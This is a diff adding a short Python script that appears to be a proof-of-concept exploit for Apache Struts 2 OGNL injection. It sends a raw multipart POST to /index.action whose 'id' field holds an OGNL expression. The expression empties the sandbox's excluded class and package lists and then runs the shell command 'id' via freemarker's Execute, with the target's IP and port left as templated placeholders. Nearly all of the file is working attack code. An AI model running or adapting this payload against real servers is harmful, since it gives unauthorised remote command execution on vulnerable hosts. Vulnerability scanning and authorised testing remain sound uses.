@@ -1,0 +1,23 @@
+import socket
+
+p = b'''POST /index.action HTTP/1.1
+Host: ${ip}:${port}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 829
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name="id"
+
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+
+'''.replace(b'\n', b'\r\n')
+
+with socket.create_connection(('${ip}', '${port}'), timeout=5) as conn:
+    conn.send(p)
+    response=conn.recv(10240).decode()
